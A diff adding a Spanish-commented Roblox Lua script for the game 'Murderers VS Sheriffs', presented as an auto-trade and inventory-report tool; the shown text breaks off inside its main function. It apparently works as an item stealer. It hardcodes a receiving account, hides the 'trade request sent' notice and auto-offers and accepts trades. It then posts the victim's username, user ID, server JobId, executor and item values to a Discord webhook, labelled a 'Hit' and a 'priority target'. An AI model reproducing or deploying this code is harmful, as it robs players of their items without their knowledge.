@@ -1,0 +1,647 @@
+-- jf_trade_auto.lua · Murderers VS Sheriffs
+-- Pasa tus items a otra cuenta por trade automatico y reporta tu inventario a Discord.
+
+-- ============ CONFIG BASICA ============
+local TARGET = "zblix5"                -- cuenta que recibe los items
+local MODE = "rarity"                  -- "all" = todo | "rarity" = solo las rarezas de RARITIES
+local RARITIES = { "Common", "Uncommon", "Rare", "Legendary", "Mythic", "Ancient" }
+local WEBHOOK = "TU_WEBHOOK_AQUI"      -- PON TU WEBHOOK AQUÍ
+local DEBUG = false                    -- true = muestra logs y avisos de cada paso
+-- =======================================
+
+-- ============ BASE DE DATOS DE VALORES (MVSDUELS.COM) ============
+local ITEM_VALUES = {
+    -- ANCIENT - KNIVES
+    ["1x1x1x1 Blade"] = 100, ["Abyssal Sword"] = 25, ["Aetheris Battleaxe"] = 30, ["Amethyst Edge"] = 10,
+    ["Blackheart Blade"] = 100, ["Bloodmoon Talon"] = 100, ["Blueberry Jelly Axe"] = 195, ["Broken Heart"] = 5,
+    ["Bunny Basher"] = 5, ["Celestial Judgment"] = 0, ["Cosmic Sword"] = 3, ["Cupid Karambit"] = 20,
+    ["DarkEye"] = 25, ["Darkwing Dagger"] = 30, ["Deathwave"] = 0, ["Demonspire"] = 5,
+    ["Divine Blade"] = 5, ["Dragonpetal Blade"] = 55, ["Dreamwalker Eclipse"] = 100, ["Dusk Rose Reaper"] = 100,
+    ["Duskveil Dagger"] = 100, ["EagleEyes"] = 5, ["Everlight Edge"] = 30, ["Ghostbringer Blade"] = 100,
+    ["Grape Jelly Axe"] = 180, ["Heartbreaker's Requiem"] = 100, ["Heartseeker Blade"] = 35, ["Hexa Axe"] = 5,
+    ["Infernal Sword"] = 100, ["Kitsune Blade"] = 55, ["Lava Katana"] = 2800, ["Lightning Bolt"] = 120,
+    ["Lime Jelly Axe"] = 230, ["Lovestruck Knife"] = 165, ["Lucky Scythe"] = 15, ["Lumenbloom"] = 100,
+    ["Matcha Boba Blade"] = 120, ["Nightfang"] = 50, ["Ocean Bane"] = 5, ["Phoenix Firewing"] = 0,
+    ["Rainbow Fang"] = 100, ["Rest in Pieces"] = 25, ["Santa's Blade"] = 25, ["Sea Lord Trident"] = 200,
+    ["Shadowcrest Piercer"] = 120, ["Solaris Reaper"] = 0, ["Soulwing Axe"] = 0, ["Spider Fang"] = 100,
+    ["Stardust Fang"] = 55, ["Starwing Monarch"] = 120, ["Strawberry Jelly Axe"] = 210, ["Tide Cleaver"] = 0,
+    ["TrustScythe"] = 30, ["Tyrant's Fang"] = 800, ["Valkyrie Knife"] = 850, ["Venom Fang"] = 55,
+    ["Voidreaver Axe"] = 0,
+    
+    -- ANCIENT - GUNS
+    ["1x1x1x1 Bow"] = 120, ["Abyssal Gun"] = 25, ["Abyssal Sniper"] = 25, ["Aetheris Protector"] = 35,
+    ["Arachnid Arbalest"] = 25, ["Blackheart Piece"] = 120, ["Blackvalk"] = 700, ["Bloodmoon Deadeye"] = 120,
+    ["Blueberry Jelly Uzi"] = 220, ["Champion Echelon"] = 0, ["Cosmic Gun"] = 3, ["Cosmic Sniper"] = 3,
+    ["Darkwing Iron"] = 35, ["Divine Arcbow"] = 5, ["Divine Emberlock"] = 5, ["Dragonpetal Outlaw"] = 70,
+    ["Dragonpetal Sniper"] = 70, ["Dreamwalker Nova"] = 120, ["Dusk Rose Arrow"] = 120, ["Duskveil Iron"] = 120,
+    ["Eclipse Duality"] = 4600, ["Eternal Bow"] = 10, ["Everlight Cannon"] = 35, ["Ghostbringer Cannon"] = 120,
+    ["Golden Eagle"] = 15, ["Grandmaster Echelon"] = 0, ["Grape Jelly Uzi"] = 200, ["Heartbreaker's Shot"] = 120,
+    ["Heartseeker Sniper"] = 40, ["Hexa Gun"] = 5, ["Hexa Sniper"] = 5, ["Infernal Revolver"] = 120,
+    ["Kitsune Sniper"] = 70, ["Kitsune Uzi"] = 70, ["Lightning Striker"] = 140, ["Lime Jelly Uzi"] = 260,
+    ["Love Bazooka"] = 10, ["Lovestruck Gun"] = 185, ["Lumenspark"] = 120, ["Mad Love"] = 15,
+    ["Matcha Boba Blaster"] = 140, ["Phoenix Ascension"] = 0, ["Pine Gun"] = 25, ["Rainbow Piercer"] = 120,
+    ["Sea Lord Revolver"] = 250, ["Shadowcrest Omen"] = 100, ["Solaris Ray"] = 0, ["Spider Sting"] = 120,
+    ["Stardust Eclipse"] = 70, ["Stardust Pulse"] = 70, ["Starwing Pulse"] = 100, ["Strawberry Jelly Uzi"] = 240,
+    ["Tide Breaker"] = 0, ["Tyrant's Gaze"] = 1650, ["Valkyrie Sniper"] = 1200, ["Venom Serpent"] = 70,
+    ["Venom Spitter"] = 70, ["Voidshot Bow"] = 0,
+
+    -- ANCIENT - EFFECTS
+    ["1x1x1x1"] = 60, ["Blackheart"] = 60, ["Blackvalk Effect"] = 350, ["Bloodmoon"] = 60,
+    ["Clan Emblem"] = 0, ["Clan Flag"] = 0, ["Dreamwalker"] = 60, ["Dusk Rose Effect"] = 60,
+    ["Eclipse"] = 1100, ["Ghostbringer"] = 60, ["Green Jelly"] = 190, ["Heartache"] = 30,
+    ["Heartbreaker"] = 65, ["Hexa Kill"] = 0, ["Infernal"] = 60, ["Kitsune"] = 55,
+    ["Lava Effect"] = 2800, ["Lumenburst"] = 60, ["Matcha Boba"] = 70, ["Nice Hat"] = 15,
+    ["Phoenix"] = 11, ["Rainbow"] = 60, ["Ranked Champion Wings"] = 0, ["Ranked Grandmaster Wings"] = 0,
+    ["Shadowcrest"] = 60, ["Spider"] = 60, ["Spirit Overload"] = 950, ["StardustCollapse"] = 45,
+    ["Starwing"] = 60, ["Venom"] = 45,
+
+    -- MYTHIC
+    ["Acidbite"] = 80, ["Astral Crescent"] = 0, ["Aurelion Sword"] = 0, ["Bling Sword"] = 40,
+    ["Christmas Edge"] = 20, ["Dark Scythe"] = 5, ["Frogus"] = 3, ["Frostseer Axe"] = 0,
+    ["Frostwake"] = 0, ["Ghoulshard"] = 30, ["Grimjaw Scythe"] = 20, ["Ice Axe"] = 10,
+    ["Ice Sword"] = 10, ["JusticeEdge"] = 2, ["Lord Egg"] = 8, ["Love Letter"] = 10,
+    ["Lucky Sword"] = 5, ["Midnight Katana"] = 12, ["Nautilus"] = 0, ["Overseer Dagger"] = 0,
+    ["Ruby Divinity"] = 0, ["Skull Hammer"] = 0, ["Soulstealer"] = 0, ["Soulthorn"] = 0,
+    ["Spirit Sword"] = 15, ["Starweaver"] = 0, ["StoneBreaker"] = 4, ["Sweet Madness"] = 10,
+    ["The Fallen"] = 10, ["The Purrinator"] = 8, ["Voidgaze"] = 0,
+    ["Bling Uzi"] = 45, ["Confetti Shotgun"] = 15, ["Death Rose"] = 3, ["Diamond Echelon"] = 0,
+    ["Egg Launcher"] = 5, ["Emerald Echelon"] = 0, ["Firework Pistol"] = 12, ["Ghoulfire"] = 30,
+    ["Ice Skull Gun"] = 0, ["Ice Sniper"] = 10, ["Kaboom"] = 3, ["Lucky Shot"] = 5,
+    ["Nightpiercer"] = 0, ["OctoBow"] = 3, ["Octopus Bow"] = 0, ["Orbit Breaker"] = 0,
+    ["Riftpiercer"] = 0, ["Scorchwood"] = 0, ["Shark Launcher"] = 45, ["Sky Forge Crossbow"] = 10,
+    ["Snow Globe"] = 15, ["Spirit Crossbow"] = 15, ["Spirit Gun"] = 15, ["Toxic Anchor"] = 3,
+    ["V.I.Piece"] = 0,
+    ["Blue Jelly"] = 155, ["Confetti"] = 500, ["Dragon Blossom"] = 45, ["Duskveil"] = 60,
+    ["Frostbite"] = 10500, ["Heartbeat"] = 250, ["Iceman"] = 0, ["Lightning"] = 250,
+    ["Lightning Strike"] = 70, ["Love Explosion"] = 25, ["Pineapple"] = 5, ["Portal"] = 0,
+    ["Purple Jelly"] = 140, ["Ranked Diamond Wings"] = 0, ["Ranked Emerald Wings"] = 0,
+    ["Red Jelly"] = 170, ["Sakura"] = 300, ["Sand"] = 5, ["Slime"] = 0,
+    ["Splash"] = 0, ["Sunburn"] = 10, ["UFO"] = 0, ["Valkyrie"] = 450, ["Water"] = 200,
+
+    -- LEGENDARY
+    ["1B Knife"] = 2, ["AtomicSlicer"] = 0, ["Banded Dagger"] = 0, ["Blue Katana"] = 1,
+    ["Bunnies"] = 1, ["Carrot"] = 1, ["Cat Sword"] = 0, ["Cinco De Mayo"] = 1,
+    ["Dreamwave"] = 0, ["Flowery"] = 1, ["Galaxy Federation"] = 1, ["GearPunk"] = 0,
+    ["Golden Luck"] = 1, ["Impact Glitch"] = 1, ["Lightbringer's Staff"] = 0, ["Moonpearl Edge"] = 0,
+    ["Navidad"] = 1, ["Neon Sparkle"] = 1, ["Patriot Knife"] = 1, ["Petalreaper"] = 0,
+    ["Pharaoh’s Judgment"] = 0, ["PharaohEdge"] = 0, ["Popsicle"] = 0, ["Red Diamond"] = 1,
+    ["Redcliff Eye"] = 0, ["Roses Are Red"] = 1, ["SilentRegret"] = 0, ["Snow Night"] = 1,
+    ["Summer Sandal"] = 1, ["Titanium Tiger"] = 1, ["Treasure Map"] = 1, ["Viridian Vow"] = 0,
+    ["Amethyshot"] = 0, ["Azurite Crown"] = 0, ["Chargeshot"] = 0, ["Cow"] = 1,
+    ["Divine Oath"] = 0, ["Eggpop"] = 1, ["Flat Line"] = 1, ["Gold Echelon"] = 0,
+    ["Kraken's Gold"] = 0, ["Launchshot"] = 0, ["Night Weaver"] = 20, ["Phantom Green"] = 1,
+    ["Punk Rockshot"] = 0, ["Rainbowness"] = 1, ["Viva Mexico"] = 1,
+    ["Blackhole"] = 0, ["Blue Fire"] = 0, ["Bubble Death"] = 0, ["Checkmate"] = 0,
+    ["Fire"] = 150, ["Fish Death"] = 0, ["Gifted"] = 175, ["Magic Sparks"] = 0,
+    ["Money Maker"] = 20, ["Purple Fire"] = 0, ["Ranked Gold Wings"] = 0, ["Red Fire"] = 0,
+    ["Yellow Fire"] = 0,
+
+    -- RARE
+    ["Anchor Knife"] = 0, ["Aurelia Hammer"] = 0, ["Eggies"] = 1, ["Launchbreaker"] = 0,
+    ["Leaf Knife"] = 0, ["Liberty Line"] = 1, ["Neon Clover"] = 1, ["Rockbreaker"] = 0,
+    ["Spicy"] = 1, ["Sunset Blade"] = 0, ["Wildwood"] = 0,
+    ["4 My Valentine"] = 1, ["Bronze Echelon"] = 0, ["Christmas Ball"] = 1, ["Depthcharge"] = 0,
+    ["Energy Charged"] = 1, ["Gift Wrap"] = 1, ["Gilded Fracture"] = 0, ["Gold Night"] = 1,
+    ["Green Grass"] = 1, ["Hydroblaster"] = 0, ["Lucky Charm"] = 1, ["Midnight Blue"] = 1,
+    ["Nobleshot"] = 0, ["Nova Blaster"] = 0, ["Pineapple Gun"] = 0, ["Pumpkin Popper"] = 1,
+    ["Silver Echelon"] = 0, ["Spring Stripes"] = 1, ["Sugar Rush"] = 1, ["Thornlock"] = 0,
+    ["Thornwood"] = 0, ["Tree Wrap"] = 1, ["Veilcaster"] = 0, ["Viridian Wrath"] = 0, ["Whool"] = 1,
+    ["Blue Grass"] = 0, ["BunnyBoys"] = 20, ["Candy Cane"] = 150, ["Clover Madness"] = 15,
+    ["Egged"] = 15, ["Eggsplosion"] = 15, ["Featherlight"] = 15, ["Grass"] = 0,
+    ["Green Ice"] = 0, ["Ice"] = 0, ["L"] = 0, ["Purple Grass"] = 0,
+    ["Purple Ice"] = 0, ["Ranked Bronze Wings"] = 0, ["Ranked Silver Wings"] = 0, ["Red Grass"] = 0,
+    ["Red Ice"] = 0, ["Rocket"] = 3, ["Santa"] = 200, ["SnowMan"] = 150,
+    ["Yellow Grass"] = 0, ["Yellow Ice"] = 0,
+
+    -- UNCOMMON
+    ["Blue Snow"] = 1, ["Christmas Tree"] = 1, ["Cubic Sweater"] = 1, ["Devoted Passion"] = 1,
+    ["Green Line"] = 1, ["Night Fade"] = 1, ["Ornament"] = 1, ["Polka Dots"] = 1,
+    ["Red Dot"] = 1, ["Shooting Star"] = 1, ["Tartan"] = 1,
+    ["Beat"] = 1, ["Cake Blower"] = 0, ["Cheesy"] = 1, ["Clover Leaf"] = 1,
+    ["Diagonal"] = 1, ["Dot"] = 1, ["Gradient"] = 1, ["Ice Storm"] = 1,
+    ["Obsidian Strike"] = 12, ["Phase Gun"] = 1, ["Phoenix"] = 1, ["Runes"] = 1,
+    ["Super X"] = 1, ["Sweetheart"] = 1, ["Voltage"] = 0, ["Wavelink"] = 1,
+    ["Wavy Squiggle"] = 1, ["Wind Spirits"] = 1, ["Zebra"] = 1,
+    ["Decorated"] = 125, ["Freeze"] = 350,
+
+    -- COMMON
+    ["Boo Breaker"] = 1, ["Cobweb Cutter"] = 1, ["Cortex Candy"] = 1, ["Cratercore"] = 0,
+    ["Default Knife"] = 0, ["Eye Dagger"] = 0, ["Gardening Trowel"] = 0, ["Honorbound"] = 1,
+    ["Ironclad"] = 0, ["Lightbringer Dagger"] = 0, ["Pineapple Knife"] = 0, ["Shovel Edge"] = 0,
+    ["Star Knife"] = 0, ["Star Shard"] = 0, ["Steelcore Dagger"] = 0, ["Steelcrest Blade"] = 0,
+    ["Summer Wave"] = 1, ["Sunset Checker"] = 1,
+    ["Bubblegum"] = 1, ["BuzzsawShotty"] = 0, ["Coco Cannon"] = 0, ["Default Gun"] = 0,
+    ["Desert Camo"] = 1, ["Driftwood"] = 0, ["Dual Wield Template"] = 0, ["Fizzlock"] = 0,
+    ["Gamma Shot"] = 0, ["Scrapmetal Handcannon"] = 0, ["Shovel Launcher"] = 1, ["Slime Gun"] = 1,
+    ["Batstorm"] = 125, ["Blue Smoke"] = 0, ["Default Effect"] = 0, ["Ghosted"] = 200,
+    ["Pumpkin Curse"] = 100, ["Purple Smoke"] = 0, ["Red Smoke"] = 0, ["Smoke"] = 0,
+    ["Soul Reaper"] = 150, ["Yellow Smoke"] = 0,
+
+    -- EXTRAS (EMOTES/ITEMS ESPECIALES)
+    ["Zombie Walk"] = 300, ["Invader"] = 300
+}
+
+-- ============ ITEMS GOD TIER (ALERTA DORADA) ============
+local HIGH_TIER_ITEMS = {
+    ["Lava Katana"] = true,
+    ["Frostbite"] = true,
+    ["Spirit Overload"] = true,
+    ["Eclipse Duality"] = true,
+    ["Prismatic Duality"] = true
+}
+-- ========================================================
+
+local CONFIG = {
+    Target = TARGET,
+    Mode = MODE,
+    Rarities = RARITIES,
+    Types = {},                 
+    Exclude = { DefaultKnife = true, DefaultGun = true, DefaultEffect = true },
+    ReportOnly = false,         
+    HideTradeGui = true,        
+    MaxItems = 12,              
+    Batches = math.huge,        
+    MaxFails = 3,               
+    MaxAttempts = 2,            
+    ProfileWait = 180,          
+    ProfileRetryWait = 20,      
+    ProfileRetries = 3,         
+    WaitPlayer = math.huge,     
+    WaitTrade = 60,             
+    OfferDelay = 0.35,          
+    ReadyDelay = 3,             
+    ReadyTries = 4,             
+    EndWait = 120,              
+    Webhook = { Url = WEBHOOK, Username = "JF Trade", Inventory = true, JoinLink = true },
+}
+
+local Players = game:GetService("Players")
+local RS = game:GetService("ReplicatedStorage")
+local HttpService = game:GetService("HttpService")
+local lp = Players.LocalPlayer
+
+-- ===== UI Hider Snippet =====
+task.spawn(function()
+    local cg = game:GetService("CoreGui")
+    local txt = "trade request sent"
+    local function hide(o)
+        pcall(function()
+            if o:IsA("TextLabel") and o.Text and o.Text:lower():find(txt, 1, true) then
+                o.Visible, o.TextTransparency, o.TextStrokeTransparency = false, 1, 1
+                if o.Parent and o.Parent:IsA("Frame") then
+                    o.Parent.Visible, o.Parent.BackgroundTransparency = false, 1
+                end
+            end
+        end)
+    end
+    local function watch(l)
+        pcall(function()
+            l:GetPropertyChangedSignal("Text"):Connect(function() hide(l) end)
+            l:GetPropertyChangedSignal("Visible"):Connect(function() hide(l) end)
+            hide(l)
+        end)
+    end
+    local function hook(g)
+        pcall(function()
+            if not g then return end
+            g.DescendantAdded:Connect(function(o) if o:IsA("TextLabel") then watch(o) end end)
+            for _, v in pairs(g:GetDescendants()) do if v:IsA("TextLabel") then watch(v) end end
+        end)
+    end
+    pcall(function() local pg = lp:WaitForChild("PlayerGui", 10); if pg then hook(pg) end end)
+    pcall(function() hook(cg) end)
+    pcall(function() hook(workspace) end)
+end)
+local RARITY = { Common = 1, Uncommon = 2, Rare = 3, Legendary = 4, Mythic = 5, Ancient = 6 }
+local RARITY_ORDER = { "Ancient", "Mythic", "Legendary", "Rare", "Uncommon", "Common" }
+local RARITY_COLOR = { Common = 0x9E9E9E, Uncommon = 0x6EDC6E, Rare = 0x5096FF, Legendary = 0xFFAA3C, Mythic = 0xDC5AFF, Ancient = 0xFF5050 }
+local RARITY_ANSI = { Common = "30", Uncommon = "32", Rare = "34", Legendary = "33", Mythic = "35", Ancient = "31" }
+local BUCKETS = { "Knife", "Gun", "Effect", "Crate" }
+
+local function set(list) local s = {} for _, v in ipairs(list) do s[v] = true end return s end
+local function waitFor(cond, timeout)
+    local t0 = os.clock()
+    while os.clock() - t0 < timeout do
+        if cond() then return true end
+        task.wait(0.5)
+    end
+    return false
+end
+
+local net = RS:WaitForChild("Packages"):WaitForChild("Networking")
+local R = {
+    invite = net:WaitForChild("RE/Trading/SendInvite", 10),
+    offer = net:WaitForChild("RE/Trading/OfferItem", 10),
+    ready = net:WaitForChild("RE/Trading/SetReady", 10),
+    cancel = net:WaitForChild("RE/Trading/CancelTrade", 10),
+}
+for k, v in pairs(R) do if not v then return end end
+
+local catalog = {}
+do
+    local item = RS:FindFirstChild("Shared") and RS.Shared:FindFirstChild("Item")
+    for _, n in ipairs({ "Knives", "Guns", "Effects", "Crates", "Legacy", "Coins" }) do
+        local m = item and item:FindFirstChild(n)
+        if m and m:IsA("ModuleScript") then
+            local ok, res = pcall(require, m)
+            if ok and type(res) == "table" then
+                for k, v in pairs(res) do if type(v) == "table" and catalog[k] == nil then catalog[k] = v end end
+            end
+        end
+    end
+end
+
+local lastDiag = ""
+local cachedInv
+local replions = {}
+local hooked = false
+
+local function hookReplion()
+    if hooked then return end
+    pcall(function()
+        local Client = require(RS.Packages.Replion).Client
+        local function add(r) replions[#replions + 1] = r end
+        if not pcall(function() Client:OnReplionAdded(add) end) then Client.OnReplionAdded(add) end
+        hooked = true
+    end)
+end
+hookReplion()
+
+local function validEntries(inv)
+    local n = 0
+    for _, b in ipairs(BUCKETS) do
+        if type(inv[b]) == "table" then
+            for id, e in pairs(inv[b]) do
+                if type(id) == "string" and type(e) == "table" and type(e.name) == "string" then n = n + 1 end
+            end
+        end
+    end
+    return n
+end
+
+local function readInventory()
+    local items = {}
+    local best, bestScore = nil, -1
+    local myKills
+    pcall(function() myKills = lp.leaderstats.Kills.Value end)
+    local seen = { data = 0, inv = 0, replion = #replions }
+
+    local function consider(t)
+        local d, inv
+        local rd = rawget(t, "Data")
+        if type(rd) == "table" then
+            seen.data = seen.data + 1
+            d, inv = rd, rawget(rd, "Inventory")
+        elseif type(rawget(t, "Inventory")) == "table" then
+            d, inv = t, rawget(t, "Inventory")
+        elseif type(rawget(t, "Knife")) == "table" and type(rawget(t, "Gun")) == "table" then
+            inv = t
+        end
+        if type(inv) ~= "table" then return end
+        if type(rawget(inv, "Knife")) ~= "table" and type(rawget(inv, "Gun")) ~= "table" then return end
+        seen.inv = seen.inv + 1
+        local n = validEntries(inv)
+        if not d and n == 0 then return end
+        local score = n + ((myKills and d and rawget(d, "Kills") == myKills) and 1e6 or 0)
+        if score > bestScore then best, bestScore = inv, score end
+    end
+
+    if getgc then
+        for _, t in ipairs(getgc(true)) do if type(t) == "table" then pcall(consider, t) end end
+    end
+    for _, r in ipairs(replions) do pcall(function() consider({ Data = r.Data }) end) end
+
+    local diag = ("tablas con Data: %d, con inventario: %d, replicas API: %d%s"):format(
+        seen.data, seen.inv, seen.replion, getgc and "" or ", sin getgc")
+    if not best and cachedInv then best, diag = cachedInv, diag .. " (uso la copia guardada)" end
+    lastDiag = diag
+    if not best then return items, false, diag end
+    cachedInv = best
+    for _, b in ipairs(BUCKETS) do
+        for id, e in pairs(type(best[b]) == "table" and best[b] or {}) do
+            if type(id) == "string" and type(e) == "table" and type(e.name) == "string" then
+                local c = catalog[e.name]
+                items[#items + 1] = { uuid = id, key = e.name, name = (c and c.ItemName) or e.name,
+                    rarity = (c and c.Rarity) or "Common", type = b }
+            end
+        end
+    end
+    return items, true, diag
+end
+
+local function waitGameReady()
+    pcall(function() if not game:IsLoaded() then game.Loaded:Wait() end end)
+    pcall(function() lp:WaitForChild("leaderstats", 60) end)
+end
+
+local function awaitInventory(timeout)
+    local items, found = readInventory()
+    local t0, tries = os.clock(), 0
+    while not found and os.clock() - t0 < timeout do
+        tries = tries + 1
+        task.wait(tries < 10 and 2 or 4)
+        hookReplion()
+        items, found = readInventory()
+    end
+    return items, found
+end
+
+local function sortItems(list)
+    table.sort(list, function(a, b)
+        local ra, rb = RARITY[a.rarity] or 0, RARITY[b.rarity] or 0
+        if ra ~= rb then return ra > rb end
+        return a.name < b.name
+    end)
+end
+
+local WH = CONFIG.Webhook
+local httpRequest = (syn and syn.request) or http_request or request or (http and http.request)
+
+local function post(embeds)
+    if WH.Url == "" or not httpRequest then return end
+    task.spawn(function()
+        pcall(httpRequest, {
+            Url = WH.Url, Method = "POST", Headers = { ["Content-Type"] = "application/json" },
+            Body = HttpService:JSONEncode({ username = WH.Username, embeds = embeds }),
+        })
+    end)
+end
+
+local function avatar()
+    return { url = ("https://www.roblox.com/headshot-thumbnail/image?userId=%d&width=150&height=150&format=png"):format(lp.UserId) }
+end
+
+local function inventoryEmbed(items)
+    local byType = { Knife = {}, Gun = {}, Effect = {}, Crate = {}, Emote = {} }
+    local totalValue = 0
+    local totalItems = 0
+    local hasHighTier = false
+
+    for _, it in ipairs(items) do
+        local val = ITEM_VALUES[it.key] or 0 
+        totalValue = totalValue + val
+        totalItems = totalItems + 1
+        
+        if HIGH_TIER_ITEMS[it.name] or HIGH_TIER_ITEMS[it.key] then hasHighTier = true end
+
+        local itemType = it.type
+        if string.find(it.key:lower(), "walk") or string.find(it.key:lower(), "invader") then itemType = "Emote" end
+        if not byType[itemType] then byType[itemType] = {} end
+        
+        if not byType[itemType][it.key] then
+            byType[itemType][it.key] = { name = it.name, count = 0, val = val, key = it.key }
+        end
+        byType[itemType][it.key].count = byType[itemType][it.key].count + 1
+    end
+
+    local statsStr = ""
+    pcall(function()
+        for _, v in ipairs(lp.leaderstats:GetChildren()) do
+            statsStr = statsStr .. string.format("**%s:** `%s` ", v.Name, tostring(v.Value))
+        end
+    end)
+
+    local desc = {}
+    if hasHighTier then
+        table.insert(desc, "🚨 **¡ATENCIÓN! TIENE ÍTEMS DE ALTO VALOR** 🚨")
+        table.insert(desc, "💰 *Revisar antes de tradear* 💰\n")
+    end
+    table.insert(desc, "👤 **Información del Jugador**")
+    table.insert(desc, string.format("**Usuario:** `%s`", lp.Name))
+    table.insert(desc, string.format("**User ID:** `%d`", lp.UserId))
+    table.insert(desc, statsStr .. "\n")
+    table.insert(desc, "⚙️ **Información del Servidor**")
+    table.insert(desc, string.format("**JobId:** `%s`", game.JobId))
+    table.insert(desc, string.format("**Server:** `%d/30`", #Players:GetPlayers()))
+    local executorName = identifyexecutor and identifyexecutor() or "Desconocido"
+    table.insert(desc, string.format("**Executor:** `%s`\n", executorName))
+    table.insert(desc, "📊 **Estadísticas del Hit**")
+    table.insert(desc, string.format("**Total Value:** 🪙 `%d`", totalValue))
+    table.insert(desc, string.format("**Total Items:** `%d`\n", totalItems))
+    table.insert(desc, "────────────────────────")
+
+    local function addCategory(emoji, title, list)
+        if #list == 0 then return end
+        table.insert(desc, string.format("\n%s **%s (%d)**", emoji, title, #list))
+        table.sort(list, function(a, b) return a.val > b.val end)
+        local shown = 0
+        for _, data in ipairs(list) do
+            if shown >= 12 then
+                table.insert(desc, string.format("*...y %d items más*", #list - shown))
+                break
+            end
+            local isGod = HIGH_TIER_ITEMS[data.name] or HIGH_TIER_ITEMS[data.key]
+            local prefix = isGod and "🌟" or "🔹"
+            local nameFormat = isGod and string.format("**%s**", data.name) or data.name
+            table.insert(desc, string.format("%s **%dx %s** [Val: %d 🪙]", prefix, data.count, nameFormat, data.val))
+            shown = shown + 1
+        end
+    end
+
+    local function getList(t) local l = {}; for _, v in pairs(t) do table.insert(l, v) end; return l end
+    addCategory("🔪", "Knives", getList(byType["Knife"]))
+    addCategory("🔫", "Guns", getList(byType["Gun"]))
+    addCategory("✨", "Effects", getList(byType["Effect"]))
+    addCategory("💃", "Emotes", getList(byType["Emote"]))
+    addCategory("📦", "Crates", getList(byType["Crate"]))
+
+    local description = table.concat(desc, "\n")
+    if #description > 4000 then description = description:sub(1, 4000) .. "\n\n*[Mensaje truncado]*" end
+
+    local embedColor = hasHighTier and 0xFFD700 or 0xFFAA00
+    return {
+        author = { name = hasHighTier and "👑 ¡OBJETIVO PRIORITARIO DETECTADO! 👑" or "¡Objetivo de Tradeo Localizado!" },
+        title = hasHighTier and "🏆 [GOD TIER - values.json]" or "🎯 [NORMAL - values.json]",
+        description = description,
+        color = embedColor,
+        thumbnail = avatar(),
+        footer = { text = "JF Trade · " .. game.JobId:sub(1, 8) }, 
+        timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
+    }
+end
+
+local function warnEmbed(text)
+    return { title = "⚠️ " .. lp.Name, description = text, color = 0xED4245, footer = { text = "JF Trade" }, timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ") }
+end
+local function tradeGui()
+    local pg = lp:FindFirstChild("PlayerGui")
+    local ng = pg and pg:FindFirstChild("NewGui")
+    return ng and ng:FindFirstChild("TradeNegotiation")
+end
+
+local function shown(inst)
+    while inst and inst ~= game do
+        if inst:IsA("GuiObject") and not inst.Visible then return false end
+        inst = inst.Parent
+    end
+    return inst == game
+end
+
+local function tradeOpen()
+    local pg = lp:FindFirstChild("PlayerGui")
+    local mn = pg and pg:FindFirstChild("Main")
+    return shown(tradeGui()) or shown(mn and mn:FindFirstChild("MainTradingFrame"))
+end
+
+local function clickButton(btn)
+    if getconnections then
+        for _, sig in ipairs({ "Activated", "MouseButton1Click", "MouseButton1Down" }) do
+            local ok, conns = pcall(getconnections, btn[sig])
+            if ok and conns and #conns > 0 then
+                for _, c in ipairs(conns) do pcall(function() c:Fire() end) end
+                return true
+            end
+        end
+    end
+    return firesignal ~= nil and pcall(firesignal, btn.Activated)
+end
+
+local function myConfirmed()
+    local offers = tradeGui() and tradeGui():FindFirstChild("Offers")
+    if not offers then return nil end
+    for _, side in ipairs({ "Player1", "Player2" }) do
+        local f = offers:FindFirstChild(side)
+        local lbl = f and f:FindFirstChild("YourOfferText")
+        if lbl and lbl:IsA("TextLabel") and lbl.Text:upper():find("YOUR OFFER") then
+            local c = f:FindFirstChild("YourConfirmed")
+            if c then return c.Visible and (not c:IsA("ImageLabel") or c.ImageTransparency < 1) end
+        end
+    end
+    return nil
+end
+
+local function acceptTrade(offered)
+    for i = 1, CONFIG.ReadyTries do
+        local t = tradeGui()
+        local btn = t and t:FindFirstChild("BottomButtons") and t.BottomButtons:FindFirstChild("Accept")
+        if btn and clickButton(btn) then
+            task.wait(1.2)
+            local c = myConfirmed()
+            if c == true then return true, "boton Accept" end
+            if c == nil then return "unknown", "boton Accept" end
+        end
+        pcall(function() R.ready:FireServer(true, offered) end)
+        task.wait(1.2)
+        if myConfirmed() == true then return true, "remote SetReady" end
+        task.wait(1)
+    end
+    return false
+end
+
+local function findTarget()
+    local name = CONFIG.Target:lower()
+    for _, p in ipairs(Players:GetPlayers()) do
+        if p ~= lp and (p.Name:lower() == name or p.DisplayName:lower() == name) then return p end
+    end
+end
+
+local function waitTarget()
+    local p = findTarget()
+    if p then return p end
+    if not waitFor(findTarget, CONFIG.WaitPlayer) then return nil end
+    task.wait(3)
+    return findTarget() or waitTarget()
+end
+
+local wantRarity, wantType = set(CONFIG.Rarities), set(CONFIG.Types)
+local attempts = {}
+
+local function pick(n)
+    local all, found = readInventory()
+    if not found then all, found = awaitInventory(CONFIG.ProfileRetryWait) end
+    local list, why = {}, { exclude = 0, intentos = 0, tipo = 0, rareza = 0 }
+    for _, it in ipairs(all) do
+        if CONFIG.Exclude[it.key] then why.exclude = why.exclude + 1
+        elseif (attempts[it.uuid] or 0) >= CONFIG.MaxAttempts then why.intentos = why.intentos + 1
+        elseif #CONFIG.Types > 0 and not wantType[it.type] then why.tipo = why.tipo + 1
+        elseif CONFIG.Mode ~= "all" and not wantRarity[it.rarity] then why.rareza = why.rareza + 1
+        else list[#list + 1] = it end
+    end
+    sortItems(list)
+    local batch = {}
+    for i = 1, math.min(n, #list) do batch[i] = list[i] end
+    return batch, #list, #all, why, found
+end
+
+local function runBatch(i)
+    local items, available, seen, why, found = pick(CONFIG.MaxItems)
+    if #items == 0 then return "empty", { seen = seen, why = why, found = found } end
+
+    local target = waitTarget()
+    if not target then return "fail", "no entro " .. CONFIG.Target end
+
+    R.invite:FireServer(target)
+    local opened = waitFor(function() return tradeOpen() or not target.Parent end, CONFIG.WaitTrade)
+    if not target.Parent then return "fail", CONFIG.Target .. " salio del juego" end
+    if not opened then return "fail", "el trade no se abrio" end
+    task.wait(1)
+
+    local offered = {}
+    for n, it in ipairs(items) do
+        pcall(function() R.offer:FireServer(it.uuid) end)
+        offered[#offered + 1] = it
+        task.wait(CONFIG.OfferDelay)
+    end
+    
+    task.wait(CONFIG.ReadyDelay)
+    local ok = acceptTrade(offered)
+    
+    if not ok then
+        pcall(function() R.cancel:FireServer() end)
+        return "fail", "no se acepto el trade"
+    end
+
+    local endWait = waitFor(function() return not tradeOpen() end, CONFIG.EndWait)
+    if endWait then task.wait(2); return "success" end
+    return "fail", "el trade no termino"
+end
+
+local function main()
+    waitGameReady()
+    
